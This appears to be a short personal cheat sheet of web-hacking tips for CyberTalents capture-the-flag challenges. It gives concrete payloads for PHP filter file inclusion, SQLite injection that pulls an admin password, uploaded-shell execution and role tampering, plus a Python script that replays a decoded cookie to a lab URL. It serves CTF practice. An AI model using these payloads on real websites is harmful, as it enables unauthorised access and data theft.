# Title: CyberTalent WriteUP , *Website Hacking CTF Tips*
- 👨‍💻By: Nathan Hailu
- 🗒Description: A CTF tips collected while playing Cyber-Talent web CTF
- 📅Date: Sun 10/25/2022
================= { START } ==============================

A) File Inclusion / path traversal
    - IF the site have file opening method like => ...?home=about
      - TRY: home=`php://filter/convert.base64-encode/resource=index`



B) IDOR


C) SQL-injection
    - If the database is **sqlite**
      - a' || (select sqlite_version()));--
      - a' || (select sql from sqlite_master));--
      - a' || (select password from xde43_users where role="admin"));--

D) XSS


E) Broken Access Control
    - **changing** role of 'user' to 'admin' will give u the flag!

F) Obfuscation
    - Some websites give you JS code for hint and they will **Obfuscate** it so to decode that use
      - This site:  https://lelinhtinh.github.io/de4js/ 
        - ON THIS the obfuscation looks js code but it is human unreadable form.
    - If you see []+[][[+]}]... kind of obfuscate it is **JSFUCK**.

G) File Upload
    - If the Uploaded file path *is known*
      - http://example.com/data/shell.pdf
        - **it wont run the php code, so try**
          - => http://example.com/index.php?data/shell.pdf

H) Headers
    - If the hint have language staff
      - change the accept-language to the hints.

I) PHP code
  - if the php code have $_SESSIONS and $_Cookies
    - you this code
      - `import requests 
        import base64
        from urllib.parse import unquote

        url="http://wcamxwl32pue3e6m5l3n94wbq36ondvjydolaevy-web.cybertalentslabs.com/index.php"

        s=requests.Session()
        r1=s.get(url)
        enc=unquote(s.cookies['secret'])
        dec=base64.b64decode(enc)
        r2=s.post(url,data={'Q':dec})
        print(r2.text)`